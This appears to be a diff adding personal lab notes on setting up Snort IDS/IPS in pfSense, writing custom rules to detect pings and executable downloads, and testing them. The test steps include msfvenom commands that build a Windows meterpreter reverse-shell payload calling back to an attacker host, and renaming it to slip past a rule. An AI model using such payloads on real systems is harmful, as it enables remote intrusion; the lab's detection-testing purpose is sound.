@@ -1,0 +1,47 @@
+Snort IDS/IPS
+Installation
+pfS dashboard>System>Package Manager
+available packages > search "snort" > install> confirm
+"Success" message will come
+Service>Snort
+Select your interface
+click add
+
+In general setting select interface(ECORP)
+Save
+Snort Interfaces>ECORP interface > Pencil Icon
+ECORP Rules 
+dropdown: custom.rules
+In Defined Custom Rules
+	For ping: alert icmp HOME_NET any -> EXTERNAL_NET any (msg:"Ping detected";sid:1000001)
+Save and come out on "Snort Interfaces"
+Click on play button on interfaces.
+Open cmd on ECORP subnet(windows) and ping 8.8.8.8
+Go to alert in pfS and check logs.
+
+FOR IPS
+click on pencil icon on interface
+scroll down to "Block Settings"
+check "Block Offenders" and "Kill States"
+Save
+now the ping will be blocked on ECORP subnets
+In Blocked, check logs
+
+
+
+For exe block
+add rule
+
+alert tcp any any -> any 80 (msg:"HTTP URI contains .exe"; content:"|2e|exe";nocase;http_uri;sid:1000002)
+
+in kali:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kaliip> LPORT=1337 -f exe > payload.exe
+python3 -m http.server 80
+open webpage on ecorp subnet and download payload.exe
+go back to pfS and check alert
+
+if file exe has been changed to something else:
+alert tcp any 80 -> any any (msg:"HTTP payload contains PE executable or DOS MZ magic number"; file_data; content:"|4D 5A|"; depth: 2; sid:100003
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kaliip> LPORT=1337 -f exe > payload.exe
+mv payload.exe payload.txt
+do the same check
